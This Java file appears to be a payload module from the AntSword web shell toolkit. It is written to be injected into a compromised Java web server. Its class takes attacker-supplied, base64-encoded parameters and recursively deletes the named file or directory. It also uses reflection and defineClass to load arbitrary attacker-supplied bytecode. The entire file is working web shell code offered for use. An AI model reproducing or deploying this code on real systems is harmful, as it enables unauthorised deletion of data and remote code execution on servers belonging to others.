package filemanager;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.lang.reflect.Field;

public class Delete {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String encoder = "base64";
    public String cs = "antswordCharset";
    public String randomPrefix = "antswordrandomPrefix";
    public String decoderClassdata;

    @Override
    public boolean equals(Object obj) {
        this.parseObj(obj);
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";
        String varkey1 = "antswordargpath";
        String varkeydecoder = "antswordargdecoder";

        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            String z1 = decode(request.getParameter(varkey1));
            this.decoderClassdata = decode(request.getParameter(varkeydecoder));
            output.append(DeleteFileOrDirCode(z1));
        } catch (Exception e) {
            output.append("ERROR:// " + e.toString());
        }
        try {
            response.getWriter().print(tag_s + this.asoutput(output.toString()) + tag_e);
        } catch (Exception ignored) {
        }
        return true;
    }

    String decode(String str) throws Exception {
        int prefixlen = 0;
        try {
            prefixlen = Integer.parseInt(randomPrefix);
            str = str.substring(prefixlen);
        } catch (Exception e) {
            prefixlen = 0;
        }
        if (encoder.equals("base64")) {
            return new String(this.Base64DecodeToByte(str), this.cs);
        }
        return str;
    }

    String DeleteFileOrDirCode(String fileOrDirPath) throws Exception {
        File f = new File(fileOrDirPath);
        if (f.isDirectory()) {
            File[] x = f.listFiles();
            for (int k = 0; k < x.length; k++) {
                if (!x[k].delete()) {
                    DeleteFileOrDirCode(x[k].getPath());
                }
            }
        }
        f.delete();
        return "1";
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[]) obj;
            request = (HttpServletRequest) data[0];
            response = (HttpServletResponse) data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
                response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception e) {
                if (obj instanceof HttpServletRequest) {
                    request = (HttpServletRequest) obj;
                    try {
                        Field req = request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest) req.get(request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        response = (HttpServletResponse) resp.get(request2);
                    } catch (Exception ex) {
                        try {
                            response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception ignored) {

                        }
                    }
                }
            }
        }
    }

    public String asoutput(String str) {
        try {
            byte[] classBytes = Base64DecodeToByte(decoderClassdata);
            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClassMethod.setAccessible(true);
            Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), classBytes, 0, classBytes.length);
            return cc.getConstructor(String.class).newInstance(str).toString();
        } catch (Exception e) {
            return str;
        }
    }

    public byte[] Base64DecodeToByte(String str) {
        byte[] bt = null;
        String version = System.getProperty("java.version");
        try {
            if (version.compareTo("1.9") >= 0) {
                Class clazz = Class.forName("java.util.Base64");
                Object decoder = clazz.getMethod("getDecoder").invoke(null);
                bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
            } else {
                Class clazz = Class.forName("sun.misc.BASE64Decoder");
                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
            }
            return bt;
        } catch (Exception e) {
            return new byte[]{};
        }
    }
}
